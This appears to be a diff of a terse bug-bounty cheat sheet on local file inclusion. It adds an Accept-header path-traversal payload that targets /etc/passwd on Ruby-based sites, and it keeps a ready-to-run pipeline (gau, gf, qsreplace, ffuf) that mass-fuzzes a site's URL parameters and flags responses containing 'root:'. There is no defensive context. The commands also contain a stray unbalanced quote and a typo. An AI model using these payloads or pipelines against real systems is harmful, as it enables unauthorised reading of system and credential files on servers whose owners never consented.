@@ -1,7 +1,7 @@
 Lfi
 ====
 
-
+`Accept: ../../../../../../../../../../etc/passwd{{`   header  when domain use progrma ruby 
 
 echo http://site.com | gau | urldedupe -qs | gf lfi |  sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:"" -v; done
 
